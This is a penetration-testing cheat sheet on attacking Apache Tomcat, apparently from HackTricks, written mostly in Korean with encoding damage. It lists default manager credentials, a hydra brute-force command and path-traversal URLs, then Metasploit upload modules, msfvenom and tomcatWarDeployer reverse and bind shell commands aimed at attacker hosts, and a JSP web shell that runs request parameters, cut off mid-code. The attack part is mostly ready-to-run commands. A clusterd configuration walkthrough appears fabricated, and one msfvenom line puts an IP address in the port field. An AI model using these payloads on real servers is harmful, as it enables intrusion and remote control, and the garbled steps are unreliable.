# Tomcat

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ ë˜ëŠ” HackTricks PDFë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

ê°€ì¥ ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ì°¾ì•„ì„œ ë” ë¹ ë¥´ê²Œ ìˆ˜ì •í•˜ì„¸ìš”. IntruderëŠ” ê³µê²© ëŒ€ìƒì„ ì¶”ì í•˜ê³  ì ê·¹ì ì¸ ìœ„í˜‘ ìŠ¤ìº”ì„ ì‹¤í–‰í•˜ì—¬ APIë¶€í„° ì›¹ ì•± ë° í´ë¼ìš°ë“œ ì‹œìŠ¤í…œê¹Œì§€ ì „ì²´ ê¸°ìˆ  ìŠ¤íƒì—ì„œ ë¬¸ì œë¥¼ ì°¾ìŠµë‹ˆë‹¤. [**ë¬´ë£Œë¡œ ì‹œë„í•´ë³´ì„¸ìš”**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ì˜¤ëŠ˜ë¶€í„°.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## ë°œê²¬

* ì¼ë°˜ì ìœ¼ë¡œ **í¬íŠ¸ 8080**ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.
* **ì¼ë°˜ì ì¸ Tomcat ì˜¤ë¥˜:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## ì—´ê±°

### **ë²„ì „ ì‹ë³„**
Apache Tomcatì˜ ë²„ì „ì„ ì°¾ìœ¼ë ¤ë©´ ê°„ë‹¨í•œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
ì´ëŠ” ë¬¸ì„œ ìƒ‰ì¸ í˜ì´ì§€ì—ì„œ "Tomcat"ì´ë¼ëŠ” ìš©ì–´ë¥¼ ê²€ìƒ‰í•˜ì—¬ HTML ì‘ë‹µì˜ ì œëª© íƒœê·¸ì—ì„œ ë²„ì „ì„ í™•ì¸í•©ë‹ˆë‹¤.

### **ë§¤ë‹ˆì € íŒŒì¼ ìœ„ì¹˜**
**`/manager`** ë° **`/host-manager`** ë””ë ‰í† ë¦¬ì˜ ì •í™•í•œ ìœ„ì¹˜ë¥¼ ì‹ë³„í•˜ëŠ” ê²ƒì€ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ë“¤ í˜ì´ì§€ì˜ ì´ë¦„ì´ ë³€ê²½ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë¬´ì°¨ë³„ ëŒ€ì… ê²€ìƒ‰ì„ ê¶Œì¥í•©ë‹ˆë‹¤.

### **ì‚¬ìš©ìëª… ì—´ê±°**
Tomcat 6ë³´ë‹¤ ì˜¤ë˜ëœ ë²„ì „ì˜ ê²½ìš° ë‹¤ìŒì„ í†µí•´ ì‚¬ìš©ìëª…ì„ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **ê¸°ë³¸ ìê²© ì¦ëª…**
**`/manager/html`** ë””ë ‰í† ë¦¬ëŠ” WAR íŒŒì¼ì˜ ì—…ë¡œë“œì™€ ë°°í¬ë¥¼ í—ˆìš©í•˜ì—¬ ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìœ¼ë¯€ë¡œ íŠ¹íˆ ë¯¼ê°í•©ë‹ˆë‹¤. ì´ ë””ë ‰í† ë¦¬ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ê¸°ë³¸ HTTP ì¸ì¦ìœ¼ë¡œ ë³´í˜¸ë©ë‹ˆë‹¤:
- admin:admin
- tomcat:tomcat
- admin:<ì•„ë¬´ê²ƒë„ ì…ë ¥í•˜ì§€ ì•ŠìŒ>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

ì´ ìê²© ì¦ëª…ì€ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
ë‹¤ë¥¸ ì£¼ëª©í• ë§Œí•œ ë””ë ‰í† ë¦¬ëŠ” **`/manager/status`**ì…ë‹ˆë‹¤. ì´ ë””ë ‰í† ë¦¬ëŠ” Tomcat ë° OS ë²„ì „ì„ í‘œì‹œí•˜ì—¬ ì·¨ì•½ì„±ì„ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

### **ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**
manager ë””ë ‰í† ë¦¬ì— ëŒ€í•œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ì‹œë„í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Metasploitì˜ ë‹¤ì–‘í•œ ë§¤ê°œë³€ìˆ˜ë¥¼ ì„¤ì •í•˜ì—¬ íŠ¹ì • í˜¸ìŠ¤íŠ¸ë¥¼ ëŒ€ìƒìœ¼ë¡œ ì„¤ì •í•˜ëŠ” ê²ƒ ì™¸ì—ë„ ë‹¤ìŒê³¼ ê°™ì€ ì¼ë°˜ì ì¸ ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤.

## ì¼ë°˜ì ì¸ ì·¨ì•½ì 

### **ë¹„ë°€ë²ˆí˜¸ ì¶”ì  ë…¸ì¶œ**
`/auth.jsp`ì— ì ‘ê·¼í•˜ë©´ í–‰ìš´ì˜ ê²½ìš° ì¶”ì  ë’¤ì— ë¹„ë°€ë²ˆí˜¸ê°€ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **ì´ì¤‘ URL ì¸ì½”ë”©**
`mod_jk`ì˜ CVE-2007-1860 ì·¨ì•½ì ì€ ì´ì¤‘ URL ì¸ì½”ë”© ê²½ë¡œ ìˆœíšŒë¥¼ í—ˆìš©í•˜ì—¬ íŠ¹ìˆ˜í•œ URLì„ í†µí•´ ê´€ë¦¬ ì¸í„°í˜ì´ìŠ¤ì— ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

Tomcatì˜ ê´€ë¦¬ ì›¹ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ ë‹¤ìŒ ê²½ë¡œë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤: `pathTomcat/%252E%252E/manager/html`

### /examples
Apache Tomcat ë²„ì „ 4.xì—ì„œ 7.xê¹Œì§€ëŠ” ì •ë³´ ë…¸ì¶œ ë° í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ… (XSS) ê³µê²©ì— ì·¨ì•½í•œ ì˜ˆì œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ ë° ì ì¬ì ì¸ ì•…ìš© ê°€ëŠ¥ì„±ì„ í™•ì¸í•˜ê¸° ìœ„í•´ ì¢…í•©ì ìœ¼ë¡œ ê²€ì‚¬í•´ì•¼ í•©ë‹ˆë‹¤. [ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **ê²½ë¡œ ìˆœíšŒ ì·¨ì•½ì **
ì¼ë¶€ [**Tomcatì˜ ì·¨ì•½í•œ êµ¬ì„±**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)ì—ì„œëŠ” ê²½ë¡œ `/..;/`ë¥¼ ì‚¬ìš©í•˜ì—¬ Tomcatì˜ ë³´í˜¸ëœ ë””ë ‰í† ë¦¬ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒì„ í†µí•´ **Tomcat ê´€ë¦¬ì** í˜ì´ì§€ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `www.vulnerable.com/lalala/..;/manager/html`

ì´ ìš”ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ë³´í˜¸ëœ ê²½ë¡œë¥¼ ìš°íšŒí•˜ëŠ” **ë˜ ë‹¤ë¥¸ ë°©ë²•**ì€ `http://www.vulnerable.com/;param=value/manager/html`ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.


## RCE

ë§ˆì§€ë§‰ìœ¼ë¡œ, Tomcat ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ ê´€ë¦¬ìì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë‹¤ë©´ .war íŒŒì¼ì„ **ì—…ë¡œë“œí•˜ê³  ë°°í¬í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì œí•œ ì‚¬í•­

WARë¥¼ ë°°í¬í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ (ì—­í• : **admin**, **manager**, **manager-script**)ì´ ì¶©ë¶„í•œ ê²½ìš°ì—ë§Œ WARë¥¼ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ `/usr/share/tomcat9/etc/tomcat-users.xml`ì— ì •ì˜ëœ _tomcat-users.xml_ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë²„ì „ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŒ) (ìì„¸í•œ ë‚´ìš©ì€ [POST](tomcat.md#post) ì„¹ì…˜ ì°¸ì¡°).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

MetasploitëŠ” ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ íœí…ŒìŠ¤íŒ…ì—ì„œ ê°€ì¥ ì¸ê¸° ìˆëŠ” í”„ë ˆì„ì›Œí¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ë‹¤ì–‘í•œ ê³µê²© ê¸°ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì‹œìŠ¤í…œì„ í…ŒìŠ¤íŠ¸í•˜ê³  ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. Metasploitì€ ë‹¤ì–‘í•œ ëª¨ë“ˆì„ ì œê³µí•˜ë©°, ì´ë¥¼ í†µí•´ ë‹¤ì–‘í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ëª¨ë“ˆì€ ì·¨ì•½ì  ìŠ¤ìºë‹, ì•…ì„± ì½”ë“œ ì‹¤í–‰, ì›ê²© ì•¡ì„¸ìŠ¤ íšë“ ë“± ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Metasploitì€ ì‚¬ìš©í•˜ê¸° ì‰½ê³  ê°•ë ¥í•œ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì‚¬ìš©ìëŠ” ëª…ë ¹ì–´ ê¸°ë°˜ ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ Metasploitì„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ì–‘í•œ ì˜µì…˜ì„ ì„¤ì •í•˜ì—¬ ê³µê²©ì„ ì¡°ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ Metasploitì€ ë‹¤ì–‘í•œ ìš´ì˜ ì²´ì œì—ì„œ ì‘ë™í•˜ë©°, ë‹¤ì–‘í•œ í”„ë¡œí† ì½œê³¼ ì„œë¹„ìŠ¤ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.

Metasploitì€ íœí…ŒìŠ¤í„°ì™€ í•´ì»¤ ëª¨ë‘ì—ê²Œ ë§¤ìš° ìœ ìš©í•œ ë„êµ¬ì…ë‹ˆë‹¤. íœí…ŒìŠ¤í„°ëŠ” ì‹œìŠ¤í…œì˜ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ Metasploitì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” Metasploitì„ ì‚¬ìš©í•˜ì—¬ ì‹œìŠ¤í…œì„ ì¹¨íˆ¬í•˜ê³  ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ Metasploitì€ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆì— ëŒ€í•œ ì´í•´ì™€ ê²½í—˜ì´ ìˆëŠ” ì‚¬ëŒë“¤ì—ê²Œ ê¶Œì¥ë˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. ë°°í¬í•  war íŒŒì¼ ìƒì„±í•˜ê¸°:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. `revshell.war` íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì ‘ê·¼í•©ë‹ˆë‹¤ (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°”ì¸ë”© ë° ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì„¤ì •í•©ë‹ˆë‹¤.

ì¼ë¶€ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: ì˜¤ë˜ëœ ë²„ì „ì˜ sun)

#### ë‹¤ìš´ë¡œë“œ
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### ë¦¬ë²„ìŠ¤ ì‰˜

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.

To create a reverse shell, the attacker typically needs to exploit a vulnerability in a web application or server that allows remote code execution. Once the attacker has gained control over the target machine, they can use various techniques to establish a reverse shell connection.

One common method is to use the `nc` (netcat) command to listen for incoming connections on a specific port. The attacker then sends a command to the target machine that initiates a connection back to the attacker's machine. Once the connection is established, the attacker can interact with the target machine's shell and execute commands remotely.

Another method is to use a tool like `Metasploit` to generate a payload that establishes a reverse shell connection. The attacker can then deliver this payload to the target machine, either by exploiting a vulnerability or by tricking the user into running a malicious file. Once the payload is executed, a reverse shell connection is established, and the attacker can gain remote access to the target machine.

It is important to note that reverse shells can be detected and blocked by firewalls and intrusion detection systems. Therefore, attackers often use techniques like encryption and obfuscation to evade detection.

ë¦¬ë²„ìŠ¤ ì‰˜ì€ ëŒ€ìƒ ì»´í“¨í„°ê°€ ê³µê²©ìì˜ ì»´í“¨í„°ë¡œ ì—°ê²°ì„ ì‹œì‘í•˜ëŠ” ì‰˜ì˜ í•œ ìœ í˜•ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ëŒ€ìƒ ì»´í“¨í„°ì— ì›ê²© ì•¡ì„¸ìŠ¤í•˜ê³  ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¦¬ë²„ìŠ¤ ì‰˜ì€ í”íˆ ì¹¨íˆ¬ í›„ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ì¹¨í•´ëœ ì‹œìŠ¤í…œì— ëŒ€í•œ ì§€ì†ì ì¸ ì•¡ì„¸ìŠ¤ë¥¼ ìœ ì§€í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

ë¦¬ë²„ìŠ¤ ì‰˜ì„ ìƒì„±í•˜ê¸° ìœ„í•´ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ë‚˜ ì„œë²„ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í—ˆìš©í•˜ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ê³µê²©ìê°€ ëŒ€ìƒ ì»´í“¨í„°ë¥¼ ì œì–´í•œ í›„ì—ëŠ” ë‹¤ì–‘í•œ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¼ë°˜ì ì¸ ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” `nc` (netcat) ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • í¬íŠ¸ì—ì„œ ë“¤ì–´ì˜¤ëŠ” ì—°ê²°ì„ ìˆ˜ì‹  ëŒ€ê¸°í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ê³µê²©ìëŠ” ëŒ€ìƒ ì»´í“¨í„°ë¡œ ì—°ê²°ì„ ì‹œì‘í•˜ëŠ” ëª…ë ¹ì„ ë³´ëƒ…ë‹ˆë‹¤. ì—°ê²°ì´ ì„¤ì •ë˜ë©´ ê³µê²©ìëŠ” ëŒ€ìƒ ì»´í“¨í„°ì˜ ì‰˜ê³¼ ìƒí˜¸ ì‘ìš©í•˜ê³  ì›ê²©ìœ¼ë¡œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ë¥¸ ë°©ë²•ì€ `Metasploit`ê³¼ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ì„ ì„¤ì •í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ í˜ì´ë¡œë“œë¥¼ ëŒ€ìƒ ì»´í“¨í„°ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•˜ê±°ë‚˜ ì‚¬ìš©ìë¥¼ ì†ì—¬ ì•…ì„± íŒŒì¼ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” ë°©ì‹ìœ¼ë¡œ ì´ë£¨ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ë©´ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ì´ ì„¤ì •ë˜ê³ , ê³µê²©ìëŠ” ëŒ€ìƒ ì»´í“¨í„°ì— ì›ê²© ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¦¬ë²„ìŠ¤ ì‰˜ì€ ë°©í™”ë²½ê³¼ ì¹¨ì… íƒì§€ ì‹œìŠ¤í…œì— ì˜í•´ ê°ì§€ë˜ê³  ì°¨ë‹¨ë  ìˆ˜ ìˆìŒì„ ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” ì¢…ì¢… ì•”í˜¸í™”ì™€ ë‚œë…í™”ì™€ ê°™ì€ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ íƒì§€ë¥¼ íšŒí”¼í•©ë‹ˆë‹¤.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### ë°”ì¸ë“œ ì‰˜

A bind shell is a type of shell that allows an attacker to gain remote access to a compromised system. It works by binding a shell to a specific port on the target system, allowing the attacker to connect to that port and gain control over the system. Bind shells are commonly used in network penetration testing to gain unauthorized access to a target system.

ë°”ì¸ë“œ ì‰˜ì€ ê³µê²©ìê°€ ì¹¨íˆ¬ëœ ì‹œìŠ¤í…œì— ì›ê²©ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ìœ í˜•ì˜ ì‰˜ì…ë‹ˆë‹¤. ì´ëŠ” ê³µê²©ìê°€ ëŒ€ìƒ ì‹œìŠ¤í…œì˜ íŠ¹ì • í¬íŠ¸ì— ì‰˜ì„ ë°”ì¸ë”©í•˜ì—¬ í•´ë‹¹ í¬íŠ¸ì— ì—°ê²°í•˜ê³  ì‹œìŠ¤í…œì„ ì œì–´í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤. ë°”ì¸ë“œ ì‰˜ì€ ë„¤íŠ¸ì›Œí¬ ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ì—ì„œ ë¬´ë‹¨ìœ¼ë¡œ ëŒ€ìƒ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### [Culsterd](https://github.com/hatRiot/clusterd) ì‚¬ìš©í•˜ê¸°

Culsterdë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í…ŒìŠ¤íŠ¸í•˜ëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤.

#### 1. Culsterd ì„¤ì¹˜

Culsterdë¥¼ ì„¤ì¹˜í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤:

```bash
$ git clone https://github.com/hatRiot/clusterd.git
$ cd clusterd
$ pip install -r requirements.txt
```

#### 2. Culsterd êµ¬ì„±

Culsterdë¥¼ êµ¬ì„±í•˜ê¸° ìœ„í•´ `config.yaml` íŒŒì¼ì„ ìˆ˜ì •í•©ë‹ˆë‹¤. í•„ìš”í•œ ì„¤ì •ì„ ì¶”ê°€í•˜ê³  ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ URLì„ ì§€ì •í•©ë‹ˆë‹¤.

```yaml
# config.yaml

# ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ URL
target: http://example.com

# í…ŒìŠ¤íŠ¸í•  ìš”ì²­ ëª©ë¡
requests:
  - GET /
  - POST /login
  - GET /admin

# í…ŒìŠ¤íŠ¸í•  ì‚¬ìš©ì ëª©ë¡
users:
  - username: admin
    password: password123
  - username: user
    password: password456
```

#### 3. Culsterd ì‹¤í–‰

Culsterdë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤:

```bash
$ python clusterd.py
```

CulsterdëŠ” ì„¤ì •ëœ ìš”ì²­ê³¼ ì‚¬ìš©ìë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤. ê²°ê³¼ëŠ” ì½˜ì†”ì— í‘œì‹œë©ë‹ˆë‹¤.

#### 4. ê²°ê³¼ ë¶„ì„

Culsterdì˜ ê²°ê³¼ë¥¼ ë¶„ì„í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì·¨ì•½ì ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µ ì½”ë“œ, ì‘ë‹µ ë³¸ë¬¸, ì‘ë‹µ ì‹œê°„ ë“±ì„ í™•ì¸í•˜ì—¬ ì·¨ì•½ì ì„ ì‹ë³„í•©ë‹ˆë‹¤.

Culsterdë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê²ƒì€ ì·¨ì•½ì ì„ ë°œê²¬í•˜ê³  ë³´ì•ˆì„ ê°•í™”í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### ìˆ˜ë™ ë°©ë²• - ì›¹ ì‰˜

ì´ [ì»¨í…ì¸ ](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ë¥¼ ê°€ì§„ **index.jsp**ë¥¼ ìƒì„±í•˜ì„¸ìš”:
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
